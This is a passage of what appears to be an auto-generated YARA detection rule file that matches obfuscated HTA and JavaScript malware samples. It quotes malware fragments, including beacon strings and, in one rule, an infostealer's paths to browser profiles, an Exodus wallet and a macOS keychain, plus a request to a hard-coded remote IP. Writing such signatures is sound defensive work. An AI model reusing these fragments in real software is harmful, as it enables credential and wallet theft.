      $s7 = " !![], _0x1eabfb[_0x3ef0e3(-0xa8, -a0_0xf61c26._0x587b71) + '\\x69\\x6d\\x65\\x4c\\x69\\x6d\\x69\\x74'] = _0x3ef0e3(-a0_0xf61c26" ascii /* score: '12.00'*/
      $s8 = ", _0x3c9953, _0x2d7a9a[_0x29169c + 0x0], 0x6, -0xbd6ddbc), _0x42b28e, _0x8a0916, _0x2e9cd5[_0x53ad16 + 0x7], 0xa, 0x432aff97), _" ascii /* score: '12.00'*/
      $s9 = "c._0xdcd264)]['\\x72\\x65\\x70\\x6c\\x61\\x63\\x65'](/'/g, '\\x27\\x27') + _0x1a62c1(0x6a, -a0_0x4b3acc._0x326680) + ('\\x57\\x4" ascii /* score: '12.00'*/
      $s10 = "cc41, _0x36983a[_0x4f2491 + 0x1], 0x5, -0x9e1da9e), _0x1c0414, _0x1e4fc4, _0xe1bbab[_0x2c0404 + 0x6], 0x9, -0x3fbf4cc0), _0x3a7e" ascii /* score: '12.00'*/
      $s11 = "f\\x77\\x48\\x61\\x72\\x64\\x54' + _0x3ef0e3(-0xa6, -0x190)] = !![], _0x1eabfb['\\x4d\\x75\\x6c\\x74\\x69\\x70\\x6c\\x65\\x49\\x" ascii /* score: '12.00'*/
      $s12 = "9\\x6c\\x65\\x5d\\x3a\\x3a\\x57\\x72' + _0x4e88b2(-a0_0x479ce5._0x21fdeb, -0x254) + _0x4e88b2(-0x16f, -0x2b) + _0x306b5a[_0x4e88" ascii /* score: '12.00'*/
      $s13 = "}(a0_0xb894, 0xe49de), document[a0_0x59a488(0x3, 0x49)]('\\x3c\\x48\\x54' + a0_0x59a488(-0x13e, -0x141) + a0_0x59a488(0x81, 0x84" ascii /* score: '12.00'*/
      $s14 = "17, _0x5c3bce, _0x37479d[_0x2af498 + 0xb], 0x10, 0x6d9d6122), _0xfabdbc, _0x5bbe5f, _0x10fe40[_0x4fbf10 + 0xe], 0x17, -0x21ac7f4" ascii /* score: '12.00'*/
      $s15 = "    return _0x49e4a6 << _0x7ed251 | _0x49e4a6 >>> 0x20 - _0x7ed251;" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 900KB and
      8 of them
}

rule sig_5814f1235514e1129ac8197b8a9d6ad320e20edaef3d025ecf59ac28c56d99ce_5814f123 {
   meta:
      description = "_subset_batch - file 5814f1235514e1129ac8197b8a9d6ad320e20edaef3d025ecf59ac28c56d99ce_5814f123.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5814f1235514e1129ac8197b8a9d6ad320e20edaef3d025ecf59ac28c56d99ce"
   strings:
      $s1 = "ac99e(-0x25d, -0x294) : '\\x78\\x38\\x36', _0x3c5697 = GetObject(_0x1ac99e(-a0_0x19eaed._0x35e0a4, -0x242) + _0x1ac99e(-0x3ba, -" ascii /* score: '17.00'*/
      $s2 = "\\x73' + '\\x74\\x65\\x6d')), _0x53ee07 = _0x1ac99e(-a0_0x19eaed._0x258335, -0x8c);" fullword ascii /* score: '13.00'*/
      $s3 = "\\x20\\x50\\x61\\x72' + _0x2feae1(-a0_0x14b578._0x5f1eb5, -a0_0x14b578._0x2b2aa1) + _0x2feae1(-0x4c, a0_0x14b578._0x3f824c) + _0" ascii /* score: '13.00'*/
      $s4 = "\\x74\\x2e\\x35\\x2e\\x31'), _0x3a5886 = _0x932e14(-a0_0x1bfbd8._0x2530d1, -0x2b0) + _0x932e14(-0x21, -0x169) + _0x2fa176(_0x24c" ascii /* score: '13.00'*/
      $s5 = "\\x72\\x69\\x74\\x79\\x5f'][_0x1ac99e(-0x1ad, -0x164)][_0x1ac99e(-0x17, -a0_0x19eaed._0x1e1254) + '\\x67'](_0x1ac99e(-a0_0x19eae" ascii /* score: '13.00'*/
      $s6 = "501863._0x409a00, 0x2bf)](_0x4e1e37 >>> 0x4 & 0xf) + _0x4c6829[_0xeffe25(0x20f, a0_0x501863._0x23ed3a)](0xf & _0x4e1e37);" fullword ascii /* score: '13.00'*/
      $s7 = "x35, a0_0x35b9a5._0x21c4a3) + _0x500465(a0_0x35b9a5._0x1e9346, a0_0x35b9a5._0x1daade) + _0x500465(a0_0x35b9a5._0x2b4f9d, -0x62))" ascii /* score: '12.00'*/
      $s8 = "(0x7c, a0_0xa79a4e._0x561b92)], _0x2adee5 = _0x2d8df7 + '\\x5c' + _0x8abdcd + _0x1b86f2(-0x1a0, -a0_0xa79a4e._0x116b29);" fullword ascii /* score: '12.00'*/
      $s9 = "f\\x77\\x73\\x20\\x53\\x65' + _0x1ac99e(-a0_0x19eaed._0x5f5473, -a0_0x19eaed._0x239955) + '\\x52\\x32' : _0x1ac99e(-a0_0x19eaed." ascii /* score: '12.00'*/
      $s10 = "2a86df._0xf46982, -a0_0x2a86df._0xd0aa4d) + '\\x64\\x65'](_0xf62870), _0x15c592 != 0x40 && (_0x504051 = _0xf56de3 + _0x3ac4d0[_0" ascii /* score: '12.00'*/
      $s11 = ")) !== -0x1 ? _0x16a219 : _0x1ac99e(-a0_0x19eaed._0x55743f, -a0_0x19eaed._0x36ba6a) + _0x1ac99e(-0x231, -0x19f) + '\\x29' : _0x2" ascii /* score: '12.00'*/
      $s12 = "_0x2a86df._0x19adfa) + _0x54b452(-a0_0x2a86df._0xb01fb5, a0_0x2a86df._0x3d4150) + _0x54b452(-0x2bf, -a0_0x2a86df._0x38affb)));" fullword ascii /* score: '12.00'*/
      $s13 = "c, -0x173848aa), _0xac8021, _0x4401a2, _0x2f05f9[_0x5a8e04 + 0x2], 0x11, 0x242070db), _0x43beab, _0xac8021, _0x2f05f9[_0x5a8e04 " ascii /* score: '12.00'*/
      $s14 = "77, _0x2ec3ed, _0x5aaeaf[_0x498887 + 0x0], 0x6, -0xbd6ddbc), _0x2ccf06, _0x2c1c77, _0x495d2c[_0x498887 + 0x7], 0xa, 0x432aff97)," ascii /* score: '12.00'*/
      $s15 = "x2ec3ed, _0x65bee7[_0x498887 + 0xd], 0x5, -0x561c16fb), _0x2ccf06, _0x2c1c77, _0x4fabae[_0x498887 + 0x2], 0x9, -0x3105c08), _0x1" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 800KB and
      8 of them
}

rule sig_60e7986ca1e4fe2384c77e6a2a1c5fbad24197fdb9aeb02b294f771fcac57134_60e7986c {
   meta:
      description = "_subset_batch - file 60e7986ca1e4fe2384c77e6a2a1c5fbad24197fdb9aeb02b294f771fcac57134_60e7986c.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "60e7986ca1e4fe2384c77e6a2a1c5fbad24197fdb9aeb02b294f771fcac57134"
   strings:
      $s1 = "nt(_0x1e2a52) + '\\x26\\x75\\x73\\x65\\x72\\x6e\\x61\\x6d\\x65\\x3d' + encodeURIComponent(_0x25b909) + _0x37174b(-a0_0x21dd57._0" ascii /* score: '15.00'*/
      $s2 = "21dd57._0x21751c) + encodeURIComponent(_0x40d312) + _0x37174b(-a0_0x21dd57._0x4c9c87, -0x20c) + encodeURIComponent(_0x53d66b) + " ascii /* score: '15.00'*/
      $s3 = "_0x37174b(-a0_0x21dd57._0x4920c8, -a0_0x21dd57._0x4f3690) + encodeURIComponent(_0x84d4b) + '\\x26\\x61\\x76\\x3d' + encodeURICom" ascii /* score: '15.00'*/
      $s4 = "0_0x21dd57._0x221303) + encodeURIComponent(_0x2a4906) + _0x37174b(-a0_0x21dd57._0x5308e8, -a0_0x21dd57._0x35e76d) + encodeURICom" ascii /* score: '15.00'*/
      $s5 = "x38\\x36', _0x375e80 = GetObject(_0x4a6b3b(a0_0x3650da._0x4a358d, a0_0x3650da._0x2ad33c) + _0x4a6b3b(a0_0x3650da._0x41e188, a0_0" ascii /* score: '13.00'*/
      $s6 = "_0x5ee303._0x1f09fe)) + _0x5d6366[_0x4fdaa2(-0xfb, -0x57)]('\\x2e')[0x0] + '\\x5c\\x72\\x75\\x6e\\x2e\\x70\\x79\\x22') : _0x8a92" ascii /* score: '12.00'*/
      $s7 = "662, _0x58fdad, _0x4faf06, _0xd5cba4[_0x104128 + 0x9], 0x4, -0x262b2fc7), _0x2a3662, _0x58fdad, _0x295780[_0x104128 + 0xc], 0xb," ascii /* score: '12.00'*/
      $s8 = "+ _0x242117(0x42, -a0_0x3accc4._0x53d7b5));" fullword ascii /* score: '12.00'*/
      $s9 = " 0x6 | 0xc0), _0x5318c1 += String[_0x22f8ec(-a0_0x81a99f._0x36ed3d, -0x238) + '\\x64\\x65'](_0x1c73a0 & 0x3f | 0x80);" fullword ascii /* score: '12.00'*/
      $s10 = "x2f5743, _0x2fa3ce[_0x3057d8 + 0x6], 0xf, -0x5cfebcec), _0x52c3f7, _0x2d088a, _0x2fa3ce[_0x3057d8 + 0xd], 0x15, 0x4e0811a1), _0x" ascii /* score: '12.00'*/
      $s11 = "' + _0x43ba03(_0x17bccf) + '\\x26\\x61\\x76\\x3d' + _0x5db5e6(_0x14cd53) + _0x55d94a(a0_0x39cdd4._0x272d3d, -a0_0x39cdd4._0x4a1e" ascii /* score: '12.00'*/
      $s12 = " _0x58fdad, _0x4faf06, _0x496fd8[_0x104128 + 0x5], 0x5, -0x29d0efa3), _0x2a3662, _0x58fdad, _0x296fe6[_0x104128 + 0xa], 0x9, 0x2" ascii /* score: '12.00'*/
      $s13 = "0x4dbb50[_0x476860 + 0x0], 0x6, -0xbd6ddbc), _0x1be732, _0x3a9fcb, _0x222b3d[_0xe4c731 + 0x7], 0xa, 0x432aff97), _0x27f6f1, _0x6" ascii /* score: '12.00'*/
      $s14 = "_0x58fdad, _0x4faf06, _0x19c249[_0x104128 + 0x1], 0x5, -0x9e1da9e), _0x2a3662, _0x58fdad, _0x491337[_0x104128 + 0x6], 0x9, -0x3f" ascii /* score: '12.00'*/
      $s15 = "58fdad, _0x4faf06, _0x3948fc[_0x104128 + 0x0], 0x7, -0x28955b88), _0x2a3662, _0x58fdad, _0x5ad123[_0x104128 + 0x1], 0xc, -0x1738" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 800KB and
      8 of them
}

rule sig_53882629b98fece085c4329ed5cca76cca39d50497db11909fd3ae1c119783a0_53882629 {
   meta:
      description = "_subset_batch - file 53882629b98fece085c4329ed5cca76cca39d50497db11909fd3ae1c119783a0_53882629.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "53882629b98fece085c4329ed5cca76cca39d50497db11909fd3ae1c119783a0"
   strings:
      $s1 = "* (parseInt(_0x5f303b(-0x13e, -0x74)) / 0x9) + -parseInt(_0x5f303b(-0x10c, -0x36)) / 0xa + parseInt(_0x5f303b(-0x1fc, -a0_0x44bc" ascii /* score: '16.00'*/
      $s2 = " (_0x34a998 += String[_0x220b6b(0xa, a0_0x306810._0x4563ba) + _0x220b6b(-a0_0x306810._0x49d025, -a0_0x306810._0x52dff1)](_0x8985" ascii /* score: '12.00'*/
      $s3 = "= String[_0x220b6b(a0_0x306810._0x26926a, 0x98) + _0x220b6b(-0x122, -a0_0x306810._0x2f5a0d)](_0x898500 & 0x3f | 0x80));" fullword ascii /* score: '12.00'*/
      $s4 = "x178) + '\\x31\\x31') !== -0x1 ? _0x8cbb7a = _0x4c6076(a0_0xeec8ef._0x3ad48a, 0x178) + '\\x31\\x31' : _0x8cbb7a = '\\x57\\x69\\x" ascii /* score: '12.00'*/
      $s5 = "5, -0x42)](_0x898500 >> 0x6 | 0xc0), _0x34a998 += String[_0x220b6b(0xb3, 0x98) + '\\x43\\x6f\\x64\\x65'](_0x898500 & 0x3f | 0x80" ascii /* score: '12.00'*/
      $s6 = "0x0)]['\\x74\\x6f\\x4c\\x6f\\x77\\x65\\x72\\x43' + _0x22d032(0x7c, -a0_0x5b17f8._0x475ae2)]() === '\\x63\\x6f\\x6d\\x70\\x75\\x7" ascii /* score: '12.00'*/
      $s7 = "a0_0x385393._0x3e4b35) + _0x42b65b(a0_0x385393._0x5baf02, a0_0x385393._0x2dbbbe) + _0x42b65b(a0_0x385393._0x2c3b0f, -0x33) + _0x" ascii /* score: '12.00'*/
      $s8 = "3\\x6b\\x54\\x79\\x70\\x65'] == 0xa && (a0_0x25c545(_0x48cde0(a0_0x1e24ba._0x19135d, -0xeb) + '\\x65' + (_0x2cea53[_0x4ad831][_0" ascii /* score: '12.00'*/
      $s9 = "ab3(-a0_0x24f15e._0x4ff7a7, -a0_0x24f15e._0x5aa98d) + '\\x63\\x74'), _0x46dd73 = new ActiveXObject(_0x28fab3(-a0_0x24f15e._0x486" ascii /* score: '12.00'*/
      $s10 = "-0x84, -a0_0x5b17f8._0x18edee) + _0x3cb528[_0x22d032(0xaa, a0_0x5b17f8._0xaac372)] + '\\x0a', _0x5da40c += _0x22d032(0x1d2, a0_0" ascii /* score: '12.00'*/
      $s11 = "a0 + Math[_0x181049(-0x1e8, -0x2bc)]() * 0xdbba0)[_0x181049(a0_0x55fec8._0x373a87, 0x28)](), _0x140088 = [];" fullword ascii /* score: '12.00'*/
      $s12 = "b80, _0x5bb071[_0x401112 + 0x6], 0xf, -0x5cfebcec), _0x54e43b, _0x4ce523, _0x5bb071[_0x401112 + 0xd], 0x15, 0x4e0811a1), _0xc0e0" ascii /* score: '12.00'*/
      $s13 = "ea53[_0x4ad831][_0x48cde0(-0x16e, -0x1ab)] == 0x9 && (a0_0x599791(_0x4c7f56 + '\\x2f' + _0x27a481 + '\\x5f\\x75\\x73\\x62\\x2e' " ascii /* score: '12.00'*/
      $s14 = "+ _0x22d032(-0x72, -a0_0x5b17f8._0x3bfae5) + _0x1d8f63[_0x22d032(0xf1, -a0_0x5b17f8._0x37ed19)] + '\\x0a', _0x5da40c += _0x22d03" ascii /* score: '12.00'*/
      $s15 = "_0x57dcf4, -a0_0x1e24ba._0x18fbf5) + _0x13e9fc), _0x2cea53[_0x4ad831][_0x48cde0(-0x237, -a0_0x1e24ba._0xc86bcf)] == 0x5 && a0_0x" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 500KB and
      8 of them
}

rule sig_3e75192394806db2cce0dcf948e48b0835cc6ed6f9acd47932a3e7d274e668a8_3e751923 {
   meta:
      description = "_subset_batch - file 3e75192394806db2cce0dcf948e48b0835cc6ed6f9acd47932a3e7d274e668a8_3e751923.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3e75192394806db2cce0dcf948e48b0835cc6ed6f9acd47932a3e7d274e668a8"
   strings:
      $s1 = "_0x315e0d >>> 0x20 - _0x4d3de7;" fullword ascii /* score: '14.00'*/
      $s2 = "38' + '\\x36', _0x9d7afa = GetObject('\\x77' + '\\x69' + '\\x6e' + '\\x6d' + '\\x67' + '\\x6d' + '\\x74' + '\\x73' + '\\x3a' + '" ascii /* score: '13.00'*/
      $s3 = ", _0x2acc07[_0x1bbd6e + 0x1], 0x4, -0x5b4115bc), _0x19c8da, _0x6fd5eb, _0x455f73[_0x1bbd6e + 0x4], 0xb, 0x4bdecfa9), _0x1cbf36, " ascii /* score: '12.00'*/
      $s4 = "    return _0x35b22b << _0x35cb77 | _0x35b22b >>> 0x20 - _0x35cb77;" fullword ascii /* score: '12.00'*/
      $s5 = "2fa7ed, _0x2a3715[_0x1bbd6e + 0x0], 0x6, -0xbd6ddbc), _0x19c8da, _0x6fd5eb, _0x1cd956[_0x1bbd6e + 0x7], 0xa, 0x432aff97), _0x1cb" ascii /* score: '12.00'*/
      $s6 = "f36, _0x19c8da, _0x316bb5[_0x1bbd6e + 0x6], 0xf, -0x5cfebcec), _0x2fa7ed, _0x1cbf36, _0x5a2d9f[_0x1bbd6e + 0xd], 0x15, 0x4e0811a" ascii /* score: '12.00'*/
      $s7 = "41603)) / 0xa * (parseInt(_0xd0b1ad(-a0_0x51b30e._0x551e80, -a0_0x51b30e._0x293ace)) / 0xb);" fullword ascii /* score: '12.00'*/
      $s8 = "760, _0x36cfe1[_0x2c0f1f + 0x6], 0xf, -0x5cfebcec), _0x27e5a2, _0x49927d, _0x36cfe1[_0x2c0f1f + 0xd], 0x15, 0x4e0811a1), _0x1240" ascii /* score: '12.00'*/
      $s9 = "db, -a0_0x51b30e._0x441be5)) / 0x2 + parseInt(_0xd0b1ad(-a0_0x51b30e._0x3e02b9, -a0_0x51b30e._0x4ed4db)) / 0x3 * (-parseInt(_0xd" ascii /* score: '12.00'*/
      $s10 = "0x4ef836, -a0_0x51b30e._0x437220)) / 0x6) + -parseInt(_0xd0b1ad(-a0_0x51b30e._0x41900a, -0x2fd)) / 0x7 + -parseInt(_0xd0b1ad(-0x" ascii /* score: '12.00'*/
      $s11 = "300, -0x302)) / 0x8 * (parseInt(_0xd0b1ad(-0x304, -0x300)) / 0x9) + parseInt(_0xd0b1ad(-a0_0x51b30e._0x551e80, -a0_0x51b30e._0x5" ascii /* score: '12.00'*/
      $s12 = "0x19c8da, _0x8adbde[_0x1bbd6e + 0xb], 0x10, 0x6d9d6122), _0x2fa7ed, _0x1cbf36, _0x58650f[_0x1bbd6e + 0xe], 0x17, -0x21ac7f4), _0" ascii /* score: '12.00'*/
      $s13 = "\\x74' + '\\x65' + '\\x3f' + '\\x69' + '\\x64' + '\\x3d' + encodeURIComponent(_0x23a847);" fullword ascii /* score: '12.00'*/
      $s14 = "2fa7ed, _0xb7abbf[_0x1bbd6e + 0x8], 0x6, 0x6fa87e4f), _0x19c8da, _0x6fd5eb, _0x6d457a[_0x1bbd6e + 0xf], 0xa, -0x1d31920), _0x1cb" ascii /* score: '12.00'*/
      $s15 = "0b1ad(-a0_0x51b30e._0xf1d9a4, -0x303)) / 0x4) + -parseInt(_0xd0b1ad(-0x309, -0x306)) / 0x5 * (-parseInt(_0xd0b1ad(-a0_0x51b30e._" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 800KB and
      8 of them
}

rule sig_6153a8244d166f61cca3995cf9236251dfafe7f0ce4f9d6f358412c4ab39ac74_6153a824 {
   meta:
      description = "_subset_batch - file 6153a8244d166f61cca3995cf9236251dfafe7f0ce4f9d6f358412c4ab39ac74_6153a824.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6153a8244d166f61cca3995cf9236251dfafe7f0ce4f9d6f358412c4ab39ac74"
   strings:
      $s1 = "+ '\\x36', _0x38e95e = GetObject('\\x77\\x69' + '\\x6e\\x6d' + '\\x67\\x6d' + '\\x74\\x73' + '\\x3a\\x5c' + '\\x5c\\x2e' + '\\x5" ascii /* score: '13.00'*/
      $s2 = ", _0x5cb865, _0x2335f3[_0x4eeff1 + 0xe], 0xf, -0x546bdc59), _0x216e9e, _0x49ee37, _0xbe4674[_0x5a1962 + 0x5], 0x15, -0x36c5fc7)," ascii /* score: '12.00'*/
      $s3 = " a0_0x202702._0xdab16d)) / 0x2) + -parseInt(_0x57f88b(0x44, a0_0x202702._0xf5af48)) / 0x3 * (-parseInt(_0x57f88b(a0_0x202702._0x" ascii /* score: '12.00'*/
      $s4 = "905, _0x478fa9[_0x51f050 + 0x6], 0xf, -0x5cfebcec), _0x56977c, _0x3f7b67, _0x478fa9[_0x51f050 + 0xd], 0x15, 0x4e0811a1), _0x35cd" ascii /* score: '12.00'*/
      $s5 = "x64\\x65' + '\\x78\\x4f' + '\\x66'](_0xebc596) !== -0x1;" fullword ascii /* score: '12.00'*/
      $s6 = " + 0x9], 0xc, -0x74bb0851), _0x1d68b1, _0x2ea80f, _0x3efd67[_0xc33e98 + 0xa], 0x11, -0xa44f), _0x30fc5b, _0x1d68b1, _0x3bbdbd[_0" ascii /* score: '12.00'*/
      $s7 = "            return _0x107d69 << _0x5c9ec5 | _0x344868 >>> 0x20 - _0x322484;" fullword ascii /* score: '12.00'*/
      $s8 = "e98 + 0x4], 0xb, 0x4bdecfa9), _0x1d68b1, _0x2ea80f, _0x229a0e[_0xc33e98 + 0x7], 0x10, -0x944b4a0), _0x30fc5b, _0x1d68b1, _0x2092" ascii /* score: '12.00'*/
      $s9 = "f050 + 0x0], 0x6, -0xbd6ddbc), _0x2bd905, _0x35cdc6, _0x478fa9[_0x51f050 + 0x7], 0xa, 0x432aff97), _0x3f7b67, _0x2bd905, _0x478f" ascii /* score: '12.00'*/
      $s10 = "3)) / 0x6) + -parseInt(_0x57f88b(0x42, a0_0x202702._0x56e736)) / 0x7 * (parseInt(_0x57f88b(0x4d, 0x50)) / 0x8) + -parseInt(_0x57" ascii /* score: '12.00'*/
      $s11 = "8e1f(_0x1d68b1, _0x2ea80f, _0x17461f, _0x30fc5b, _0xccd532[_0xc33e98 + 0x0], 0x6, -0xbd6ddbc), _0x2ea80f, _0x17461f, _0x9ec5ee[_" ascii /* score: '12.00'*/
      $s12 = "ae00, _0x1a0919[_0xdda32e + 0xa], 0x11, -0xa44f), _0x46d917, _0x4633c8, _0x14c8da[_0x3c4ba1 + 0xb], 0x16, -0x76a32842), _0x1c79c" ascii /* score: '12.00'*/
      $s13 = "e00, _0x402a03[_0x11b001 + 0x0], 0x6, -0xbd6ddbc), _0x42082e, _0x57ba55, _0x2337a1[_0x261045 + 0x7], 0xa, 0x432aff97), _0xd70df3" ascii /* score: '12.00'*/
      $s14 = "0xc33e98 + 0xf], 0xa, -0x1d31920), _0x1d68b1, _0x2ea80f, _0x65b77[_0xc33e98 + 0x6], 0xf, -0x5cfebcec), _0x30fc5b, _0x1d68b1, _0x" ascii /* score: '12.00'*/
      $s15 = "3[_0xc33e98 + 0xe], 0x17, -0x21ac7f4), _0x17461f = _0x410a97(_0x17461f, _0x30fc5b = _0x5ba9e6(_0x30fc5b, _0x1d68b1 = _0xbafb5b(_" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 600KB and
      8 of them
}

rule sig_726dc7e78b2e7a7cc52647ace7d0800fa4c43b93534dfa22e984b6b9ba02cb3a_726dc7e7 {
   meta:
      description = "_subset_batch - file 726dc7e78b2e7a7cc52647ace7d0800fa4c43b93534dfa22e984b6b9ba02cb3a_726dc7e7.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "726dc7e78b2e7a7cc52647ace7d0800fa4c43b93534dfa22e984b6b9ba02cb3a"
   strings:
      $s1 = "38' + '\\x36', _0x2f9147 = GetObject('\\x77\\x69' + '\\x6e\\x6d' + '\\x67\\x6d' + '\\x74\\x73' + '\\x3a\\x5c' + '\\x5c\\x2e' + '" ascii /* score: '13.00'*/
      $s2 = "00e0 + 0x0], 0x6, -0xbd6ddbc), _0x5d600c, _0xd5e4d4, _0x1a4943[_0x1f00e0 + 0x7], 0xa, 0x432aff97), _0x1fa25f, _0x5d600c, _0x1a49" ascii /* score: '12.00'*/
      $s3 = "00c, _0x1a4943[_0x1f00e0 + 0x6], 0xf, -0x5cfebcec), _0x532063, _0x1fa25f, _0x1a4943[_0x1f00e0 + 0xd], 0x15, 0x4e0811a1), _0xd5e4" ascii /* score: '12.00'*/
      $s4 = "            return _0xfab8cd << _0x52a50f | _0x508ab4 >>> 0x20 - _0x99edc5;" fullword ascii /* score: '12.00'*/
      $s5 = "    return _0xd13397 << _0x46f606 | _0xd13397 >>> 0x20 - _0x46f606;" fullword ascii /* score: '12.00'*/
      $s6 = " 0x215)) / 0x2) + -parseInt(_0x4d8ba0(a0_0x541440._0x467866, a0_0x541440._0x5b63d9)) / 0x3 + -parseInt(_0x4d8ba0(a0_0x541440._0x" ascii /* score: '12.00'*/
      $s7 = "4a, _0x451deb, _0xd57ba8[_0x20e1b1 + 0x1], 0x4, -0x5b4115bc), _0x3780e1, _0x207ab5, _0x37f0e8[_0x34b510 + 0x4], 0xb, 0x4bdecfa9)" ascii /* score: '12.00'*/
      $s8 = "f1b, _0x3452db, _0x3f5e9d[_0x352f9f + 0x5], 0x4, -0x5c6be), _0x5d1e64, _0x3afae9, _0x4768b2[_0x468212 + 0x8], 0xb, -0x788e097f)," ascii /* score: '12.00'*/
      $s9 = ", _0x145ee7, _0x3560ae, _0xfc638c[_0x73311a + 0x3], 0xe, -0xb2af279), _0x274f8f, _0x2eeadf, _0x755205[_0x33ed39 + 0x8], 0x14, 0x" ascii /* score: '12.00'*/
      $s10 = "38, _0x35ebbf, _0x5e00cb[_0x119838 + 0xd], 0x5, -0x561c16fb), _0x4404b7, _0x2c7180, _0xb2688f[_0x5c7807 + 0x2], 0x9, -0x3105c08)" ascii /* score: '12.00'*/
      $s11 = "20), _0x47b4df, _0x5333aa, _0x3e6948[_0x118ba1 + 0x6], 0xf, -0x5cfebcec), _0x1657ed, _0x137af6, _0x3092d6[_0x55e177 + 0xd], 0x15" ascii /* score: '12.00'*/
      $s12 = "xdc8199, _0x466d0c, _0x22eeda[_0x46d73b + 0xe], 0x11, -0x5986bc72), _0x2f8633, _0x3380cf, _0x284b29[_0x4771a5 + 0xf], 0x16, 0x49" ascii /* score: '12.00'*/
      $s13 = " + '\\x76\\x3d') + encodeURIComponent(_0x1a9ba0) + ('\\x26\\x75' + '\\x73\\x65' + '\\x72\\x6e' + '\\x61\\x6d' + '\\x65\\x3d') + " ascii /* score: '11.00'*/
      $s14 = "== 0x6 && (a0_0x3540d7(_0x810823[_0xbebdf2]['\\x75\\x72' + '\\x6c']) == !![] && a0_0x1e64c0(_0x3eae7a, _0x1b3b16, _0x810823[_0xb" ascii /* score: '11.00'*/
      $s15 = "+ '\\x49\\x64' + '\\x3d') + encodeURIComponent(_0x5bda27) + ('\\x26\\x6f' + '\\x73\\x3d') + encodeURIComponent(_0x49e82a) + ('" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 600KB and
      8 of them
}

rule sig_1c3ea5b06b394e295c7313e87135f8fe62a85722bb95e5870287b98d2c4fe70f_1c3ea5b0 {
   meta:
      description = "_subset_batch - file 1c3ea5b06b394e295c7313e87135f8fe62a85722bb95e5870287b98d2c4fe70f_1c3ea5b0.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1c3ea5b06b394e295c7313e87135f8fe62a85722bb95e5870287b98d2c4fe70f"
   strings:
      $x1 = "  kOUDShh(ft7j15J = {}, xhgDfW = [\"R_>@OzaPOOrV)DlF+v\\\"I_Z7}$,&G4mhblCfdR5sD\", \"I4ca6{~oqM(zCVhEzR?F}5(Gm|v(\\\"._z\\\"zk_1" ascii /* score: '33.50'*/
      $s2 = "  const ex = require(\"child_process\").exec;" fullword ascii /* score: '24.00'*/
      $s3 = " ? getAbsolutePath('~/') + '/.config/' + _0x3f862c[2] : getAbsolutePath('~/') + \"/AppData/\" + _0x3f862c[0] + \"/User Data\";" fullword ascii /* score: '23.00'*/
      $s4 = "0] ? getAbsolutePath('~/') + \"/.config/\" + _0x58e4a7[2] : getAbsolutePath('~/') + '/AppData/' + _0x58e4a7[0] + \"/User Data\";" ascii /* score: '23.00'*/
      $s5 = "    const _0x1789e8 = getAbsolutePath('~/') + \"/AppData/Roaming/Mozilla/Firefox/Profiles\";" fullword ascii /* score: '23.00'*/
      $s6 = "            await uploadFiles(getAbsolutePath('~/') + \"/AppData/Local/Microsoft/Edge/User Data\", '3_', false, _0x1a5fed);" fullword ascii /* score: '19.00'*/
      $s7 = "      _0x35417a = getAbsolutePath('~/') + \"/AppData/Roaming/Exodus/exodus.wallet\";" fullword ascii /* score: '18.00'*/
      $s8 = "    _0x37b0da = 'd' == platform[0] ? getAbsolutePath('~/') + \"/Library/Application Support/\" + _0x3f862c[1] : 'l' == platform[" ascii /* score: '17.00'*/
      $s9 = "    let _0x3c5a15 = homeDir + \"/Library/Keychains/login.keychain\";" fullword ascii /* score: '17.00'*/
      $s10 = "      _0x4ed2de = 'd' == platform[0] ? getAbsolutePath('~/') + \"/Library/Application Support/\" + _0x58e4a7[1] : 'l' == platfor" ascii /* score: '17.00'*/
      $s11 = "le.log(bzkTys(UtnxKe)));" fullword ascii /* score: '16.00'*/
      $s12 = "JYH(0xb7)], R0n30f_ = ivNw1R[IqGJYH(0xb8)], YGZEVvf = jI99_o(N515SNA[0x2d]), process[IqGJYH(0xb9)] = IqGJYH(0xba), process[N515S" ascii /* score: '15.00'*/
      $s13 = "  const X = [\"Roaming/Opera Software/Opera Stable\", \"com.operasoftware.Opera\", \"opera\"];" fullword ascii /* score: '15.00'*/
      $s14 = "        request.get(\"http://146.70.253.107:1224/client/5346/64\", (_0xa9f58d, _0x55032e, _0x184942) => {" fullword ascii /* score: '15.00'*/
      $s15 = "NA[0x2e]](IqGJYH(0xbb), function (y_F_WJl) {}), process[N515SNA[0x2e]](IqGJYH(0xbc), function (y_F_WJl) {}), kGGrRHq = YGZEVvf[D" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x7274 and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule sig_72654b796e06701facc10e86780f31a043faed5484214d6baac38eb7e594285b_72654b79 {
   meta:
      description = "_subset_batch - file 72654b796e06701facc10e86780f31a043faed5484214d6baac38eb7e594285b_72654b79.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "72654b796e06701facc10e86780f31a043faed5484214d6baac38eb7e594285b"
   strings:
      $s1 = "//<script type=\"text/javascript\" src=\"//assets.pinterest.com/js/pinit.js\"></script>" fullword ascii /* score: '20.00'*/
      $s2 = "//.find('.description').width(jQuery(this).width() - 20);" fullword ascii /* score: '18.00'*/
      $s3 = "po.src = 'http://assets.pinterest.com/js/pinit.js';" fullword ascii /* score: '17.00'*/
      $s4 = "po.src = 'https://apis.google.com/js/plusone.js';" fullword ascii /* score: '17.00'*/
      $s5 = "var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);" fullword ascii /* score: '15.00'*/
